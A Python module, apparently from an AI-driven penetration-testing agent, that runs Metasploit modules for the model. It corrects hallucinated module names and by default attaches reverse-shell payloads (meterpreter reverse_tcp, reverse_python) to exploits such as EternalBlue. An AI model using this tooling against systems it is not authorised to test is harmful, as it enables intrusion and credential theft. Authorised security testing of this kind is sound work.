#!/usr/bin/env python3
"""
"""

import logging
import os
import re
import shutil
import subprocess
from typing import Optional

# Load config
try:
    from core.execution import (
        ExecutionCancelled,
        current_execution_context,
        redact_sensitive_command,
    )
    from core.tools.base import (
        _bounded_process_output,
        _terminate_process_tree,
        get_tool_config,
    )
except ImportError:
    def get_tool_config(name): return {}

C_YELLOW = "\033[93m"
C_RESET  = "\033[0m"


def _parse_msf_options(options_str: str) -> dict:
    """
    Parse MSF options from various formats AI might produce:
    
    Supported formats:
    - "RHOSTS=192.168.1.5, RPORT=80"           → standard
    - "RHOSTS=192.168.1.5 RPORT=80"            → space-separated
    - "RHOSTS=192.168.1.5 | RPORT=80"          → pipe-separated (common AI mistake)
    - "RHOSTS=192.168.1.5, USER_FILE=/tmp/u.txt, PASS_FILE=/usr/share/wordlists/rockyou.txt"
    
    Returns dict of {KEY: VALUE}
    """
    opts = {}
    if not options_str:
        return opts

    # Clean up: remove extra pipes that AI sometimes adds between options
    # "RHOSTS=IP | USER_FILE=/tmp/users.txt" → "RHOSTS=IP, USER_FILE=/tmp/users.txt"
    clean = options_str.strip()
    
    # Strategy: find all KEY=VALUE pairs using regex
    # This handles any separator (comma, pipe, space, etc.)
    for match in re.finditer(r'(\w+)\s*=\s*(\S+)', clean):
        key = match.group(1).strip()
        value = match.group(2).strip().rstrip(',').rstrip('|')
        opts[key] = value

    return opts


def _setdefault_option_ci(opts: dict, key: str, value: str) -> None:
    """Set an MSF option unless the same option is already present by case."""
    key_upper = key.upper()
    if any(str(existing).upper() == key_upper for existing in opts):
        return
    opts[key] = value


def run_msf_module(module: str, options_str: str, timeout: Optional[int] = None, mode: str = "run") -> str:
    """
    Runs msfconsole with a specific module and options.
    Handles multiple model-generated option formats.
    
    Args:
        module: MSF module path, e.g. "exploit/unix/ftp/vsftpd_234_backdoor"
        options_str: Options string, e.g. "RHOSTS=192.168.1.5, RPORT=80"
        timeout: Execution timeout in seconds
        mode: "check" for exploit check/auxiliary run, "run" for active execution
    """
    if not shutil.which("msfconsole"):
        return "[!] msfconsole is not installed or not in PATH. Use exploit_select/searchsploit for planning, or install Metasploit to enable msf_check."

    # Resolve timeout from config if not passed explicitly
    if timeout is None:
        tc = get_tool_config("msfconsole")
        timeout = tc.get("timeout", 300)

    # Clean module name (remove leading/trailing whitespace, quotes)
    module = module.strip().strip('"').strip("'")

    # Correct common model-generated aliases to valid Metasploit modules.
    _MODULE_CORRECTIONS = {
        # ── SSH ──────────────────────────────────────────────────────
        "exploit/unix/ssh/ssh_login":       "auxiliary/scanner/ssh/ssh_login",
        "exploit/ssh/ssh_login":            "auxiliary/scanner/ssh/ssh_login",
        "exploit/linux/ssh/ssh_login":      "auxiliary/scanner/ssh/ssh_login",
        "exploit/multi/ssh/ssh_login":      "auxiliary/scanner/ssh/ssh_login",
        "exploit/unix/ssh/ssh_enumusers":   "auxiliary/scanner/ssh/ssh_enumusers",
        "exploit/ssh/ssh_enumusers":        "auxiliary/scanner/ssh/ssh_enumusers",
        "exploit/linux/ssh/openssh_authbypass": None,
        "exploit/linux/ssh/openssh_rce":    None,
        "exploit/linux/ssh/openssh_7.2":    None,
        "exploit/linux/ssh/openssh_user_enumeration": "auxiliary/scanner/ssh/ssh_enumusers",
        "auxiliary/scanner/ssh/ssh_version": None,
        "auxiliary/scanner/ssh/ssh-info":    None,
        "auxiliary/scanner/ssh/ssh_info":    None,
        # ── FTP ──────────────────────────────────────────────────────
        "auxiliary/scanner/ftp/vsftpd_234_backdoor": "exploit/unix/ftp/vsftpd_234_backdoor",
        "exploit/ftp/vsftpd_234_backdoor":  "exploit/unix/ftp/vsftpd_234_backdoor",
        "exploit/linux/ftp/vsftpd_234":     "exploit/unix/ftp/vsftpd_234_backdoor",
        "exploit/ftp/proftpd_modcopy":      "exploit/unix/ftp/proftpd_modcopy_exec",
        "exploit/linux/ftp/proftpd_modcopy": "exploit/unix/ftp/proftpd_modcopy_exec",
        # ── SMB / Windows ────────────────────────────────────────────
        "exploit/scanner/smb/smb_ms17_010": "auxiliary/scanner/smb/smb_ms17_010",
        "exploit/smb/ms17_010":             "exploit/windows/smb/ms17_010_eternalblue",
        "exploit/smb/eternalblue":          "exploit/windows/smb/ms17_010_eternalblue",
        "exploit/windows/smb/ms17_010":     "exploit/windows/smb/ms17_010_eternalblue",
        "exploit/smb/psexec":               "exploit/windows/smb/psexec",
        "exploit/linux/smb/samba_usermap":   "exploit/multi/samba/usermap_script",
        "exploit/samba/usermap_script":      "exploit/multi/samba/usermap_script",
        # ── MySQL / PostgreSQL / Redis ───────────────────────────────
        "exploit/mysql/mysql_login":         "auxiliary/scanner/mysql/mysql_login",
        "exploit/scanner/mysql/mysql_login": "auxiliary/scanner/mysql/mysql_login",
        "exploit/postgres/postgres_login":   "auxiliary/scanner/postgres/postgres_login",
        "exploit/scanner/postgres/postgres_login": "auxiliary/scanner/postgres/postgres_login",
        "exploit/redis/redis_rce":           None,
        "exploit/linux/redis/redis_rce":     None,
        "auxiliary/scanner/redis/redis_login": None,
        # ── HTTP / Web ───────────────────────────────────────────────
        "auxiliary/scanner/http/http-headers": None,
        "auxiliary/scanner/http/http_headers": None,
        "auxiliary/scanner/http/http_enum":   None,
        "auxiliary/scanner/http/robots_txt":  None,
        "auxiliary/scanner/http/http_version": None,
        "auxiliary/scanner/http/ssl_enum":    None,
        "auxiliary/scanner/ssl/ssl_enum":     None,
        "exploit/multi/http/log4shell":       None,
        "exploit/multi/http/apache_rce":      None,
        "exploit/linux/http/apache_rce":      None,
        # ── Tomcat ───────────────────────────────────────────────────
        "exploit/multi/http/tomcat_mgr_deploy": "exploit/multi/http/tomcat_mgr_upload",
        "exploit/http/tomcat_mgr_deploy":    "exploit/multi/http/tomcat_mgr_upload",
        "exploit/tomcat/manager_deploy":     "exploit/multi/http/tomcat_mgr_upload",
        "auxiliary/scanner/http/tomcat_login": "auxiliary/scanner/http/tomcat_mgr_login",
        # ── Jenkins ──────────────────────────────────────────────────
        "exploit/linux/http/jenkins_rce":    "exploit/multi/http/jenkins_script_console",
        "exploit/http/jenkins_script":       "exploit/multi/http/jenkins_script_console",
        "exploit/jenkins/groovy_rce":        "exploit/multi/http/jenkins_script_console",
        # ── RDP / VNC ────────────────────────────────────────────────
        "exploit/rdp/bluekeep":              "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
        "exploit/windows/rdp/bluekeep":      "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
        "auxiliary/scanner/rdp/rdp_login":   None,
        "auxiliary/scanner/vnc/vnc_login":   "auxiliary/scanner/vnc/vnc_login",
        "exploit/vnc/vnc_login":             "auxiliary/scanner/vnc/vnc_login",
        # ── Elasticsearch / Kibana ───────────────────────────────────
        "exploit/elasticsearch/rce":         None,
        "exploit/multi/elasticsearch/rce":   None,
        "exploit/linux/http/elasticsearch_rce": None,
        # ── OpenVPN (constant hallucination target) ──────────────────
        "exploit/linux/openvpn/openvpn_cve_2021_44228": None,
        "auxiliary/scanner/openvpn/openvpn_version": None,
        "exploit/linux/openvpn/openvpn_rce": None,
        "auxiliary/scanner/openvpn/openvpn_scan": None,
        # ── Generic handler corrections ──────────────────────────────
        "exploit/multi/handler/reverse_tcp": "exploit/multi/handler",
        "exploit/handler":                   "exploit/multi/handler",
    }
    original_module = module
    module_lower = module.lower()
    if module_lower in _MODULE_CORRECTIONS:
        corrected = _MODULE_CORRECTIONS[module_lower]
        if corrected is None:
            return f"[!] MSF module '{module}' does NOT EXIST in Metasploit. AI: do NOT retry this module. Use [CMD:] or [SEARCH:] instead."
        module = corrected
        print(f"  {C_YELLOW}[FIX] MSF module corrected: '{original_module}' → '{module}'{C_RESET}")

    # Validate module format
    if not module or len(module.split('/')) < 2:
        return f"[!] Invalid MSF module format: '{module}'. Expected format: category/type/name"

    # Parse options with robust parser
    opts = _parse_msf_options(options_str)
    
    if not opts.get("RHOSTS"):
        return "[!] MSF module requires RHOSTS option. Add target IP."

    mode = (mode or "run").strip().lower()
    if mode not in {"check", "run"}:
        return f"[!] Invalid MSF mode: {mode}. Expected 'check' or 'run'."

    login_check_module = mode == "check" and (
        "_login" in module.lower() or module.lower().endswith("/login")
    )
    if login_check_module:
        _setdefault_option_ci(opts, "STOP_ON_SUCCESS", "true")
        _setdefault_option_ci(opts, "VERBOSE", "false")
        _setdefault_option_ci(opts, "CreateSession", "false")

    # Build the msfconsole command script
    script = f"use {module}; "
    for k, v in opts.items():
        script += f"set {k} {v}; "
    
    # Auto-set payload for exploit modules
    if module.startswith("exploit/") and not opts.get("PAYLOAD"):
        # Default payloads by platform
        if "unix" in module or "linux" in module:
            script += "set PAYLOAD cmd/unix/reverse_python; "
        elif "windows" in module:
            script += "set PAYLOAD windows/meterpreter/reverse_tcp; "
        else:
            script += "set PAYLOAD generic/shell_reverse_tcp; "
        # Set LHOST if not specified
        if not opts.get("LHOST"):
            script += "set LHOST 0.0.0.0; "
        if not opts.get("LPORT"):
            script += "set LPORT 4444; "
    
    # Use 'run' instead of 'exploit' for auxiliary modules. In check mode,
    # exploit modules use Metasploit's check action when available.
    if module.startswith("auxiliary/"):
        script += "run; exit -y"
    elif mode == "check":
        script += "check; exit -y"
    else:
        script += "exploit -z; exit -y"

    print(f"  [*] MSF Module: {module}")
    print(f"  [*] MSF Options: {opts}")
    print(f"  [*] MSF Script: {redact_sensitive_command(script)}")

    try:
        import threading
        import time

        lines = []
        login_success_seen = [False]
        start = time.time()
        context = current_execution_context()
        output_bytes = 0
        output_limited = [False]
        cancel_reason = ""
        last_heartbeat = 0
        # Reduce timeout for auxiliary (scan) modules — they shouldn't take long
        msf_timeout = min(timeout, 60) if module.startswith("auxiliary/") or mode == "check" else min(timeout, 120)
        msf_timeout = max(1, min(msf_timeout, context.max_runtime_seconds))

        proc = subprocess.Popen(
            ["msfconsole", "-q", "-n", "-x", script],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            start_new_session=(os.name == "posix"),
        )

        def _read():
            nonlocal output_bytes
            try:
                for line in proc.stdout:
                    line = line.rstrip('\n')
                    encoded = (line + "\n").encode("utf-8", "replace")
                    remaining = context.max_output_bytes - output_bytes
                    if len(encoded) > remaining:
                        if remaining > 0:
                            lines.append(
                                encoded[:remaining].decode("utf-8", "ignore").rstrip("\n")
                            )
                            output_bytes += remaining
                        output_limited[0] = True
                        _terminate_process_tree(proc)
                        break
                    output_bytes += len(encoded)
                    lines.append(line)
                    # Show important MSF lines live
                    if any(kw in line.lower() for kw in [
                        "session", "meterpreter", "login", "success", "found",
                        "command shell", "password", "[+]", "error", "failed"
                    ]):
                        elapsed = int(time.time() - start)
                        print(
                            f"      [MSF {elapsed}s] "
                            f"{redact_sensitive_command(line)[:120]}"
                        )
                    if login_check_module and re.search(r"\[\+\].+\bSuccess:\s+'[^']+'", line, re.IGNORECASE):
                        login_success_seen[0] = True
            except (ValueError, OSError):
                pass  # stdout closed during kill — expected

        reader = threading.Thread(target=_read, daemon=True)
        reader.start()

        while reader.is_alive():
            reader.join(timeout=1)
            elapsed = int(time.time() - start)
            if context.cancellation.cancelled:
                cancel_reason = context.cancellation.reason_code
                _terminate_process_tree(proc)
                reader.join(timeout=2)
                lines.append(f"[CANCELLED] {cancel_reason}")
                break
            if login_success_seen[0] and elapsed >= 5:
                _terminate_process_tree(proc)
                try:
                    proc.stdout.close()
                except Exception as _exc:
                    logging.debug(f"Suppressed in msf.py: {_exc}")
                lines.append("[+] MSF login check stopped after first success (CreateSession=false)")
                break
            if elapsed > msf_timeout:
                _terminate_process_tree(proc)
                # Close stdout pipe to unblock reader thread
                try:
                    proc.stdout.close()
                except Exception as _exc:
                    logging.debug(f"Suppressed in msf.py: {_exc}")
                lines.append(f"[!] MSF timed out after {msf_timeout}s")
                print(f"      [TIMEOUT] MSF killed after {msf_timeout}s")
                break
            if reader.is_alive() and elapsed - last_heartbeat >= 15:
                last_heartbeat = elapsed
                print(f"      [♻ MSF running... {elapsed}s / {msf_timeout}s max]")

        # Wait for process cleanup with timeout
        try:
            proc.wait(timeout=10)
        except subprocess.TimeoutExpired:
            _terminate_process_tree(proc)
            try:
                proc.stdout.close()
            except Exception as _exc:
                logging.debug(f"Suppressed in msf.py: {_exc}")
            try:
                proc.wait(timeout=5)
            except Exception as _exc:
                logging.debug(f"Suppressed in msf.py: {_exc}")

        # Filter MSF noise
        filtered = [
            line
            for line in lines
            if line.strip()
            and not line.startswith("[*] Starting ")
            and "msf" not in line.lower()[:10]
        ]
        if output_limited[0]:
            filtered.append(
                f"[OUTPUT LIMIT] process killed at {context.max_output_bytes} bytes"
            )
        out = _bounded_process_output("\n".join(filtered), context.max_output_bytes)
        if cancel_reason:
            raise ExecutionCancelled(
                cancel_reason,
                stdout=out,
                returncode=proc.returncode,
            )

        # Detect errors early
        out_lower = out.lower()
        if "unknown command" in out_lower or "invalid module" in out_lower:
            return f"[!] MSF module '{module}' does NOT EXIST. AI: do NOT retry this module. Use [SEARCH:] or [SEARCHSPLOIT:] instead."
        if "failed to load" in out_lower:
            return f"[!] MSF module '{module}' FAILED TO LOAD — module does NOT exist in this Metasploit installation. AI: do NOT retry '{module}' or any variation of it. Use [SEARCH:] or [SEARCHSPLOIT:] instead."
        if "optionvalidateerror" in out_lower or "failed to validate" in out_lower:
            return f"[!] MSF module '{module}' has INVALID OPTIONS. AI: check required options. Do NOT retry with the same option set."

        res = "MSF Execution Results:\n"
        if out:
            res += out + "\n"
        return res if out else f"[!] No MSF Output. Module '{module}' may not exist or target is not vulnerable. AI: try [SEARCHSPLOIT:] instead."

    except subprocess.TimeoutExpired:
        return f"[!] MSF execution timed out after {timeout} seconds."
    except ExecutionCancelled:
        raise
    except Exception as e:
        safe_error = redact_sensitive_command(str(e))[:1024]
        return f"[!] MSF unexpected error: {type(e).__name__}: {safe_error}"


if __name__ == "__main__":
    # Quick test with various option formats
    print("Testing MSF option parser...")
    
    test_cases = [
        "RHOSTS=192.168.1.5, RPORT=80",
        "RHOSTS=192.168.1.5 RPORT=80",
        "RHOSTS=192.168.1.5 | USER_FILE=/tmp/users.txt | PASS_FILE=/usr/share/wordlists/rockyou.txt",
        "RHOSTS=192.168.1.5, USER_FILE=/tmp/users.txt, PASS_FILE=/usr/share/wordlists/rockyou.txt",
    ]
    
    for tc in test_cases:
        parsed = _parse_msf_options(tc)
        print(f"  Input:  {tc}")
        print(f"  Parsed: {parsed}")
        print()
    
    # Live test if msfconsole is available
    if shutil.which("msfconsole"):
        out = run_msf_module("auxiliary/scanner/portscan/tcp", "RHOSTS=127.0.0.1, PORTS=80")
        print(out)
    else:
        print("[!] msfconsole not available for live test.")
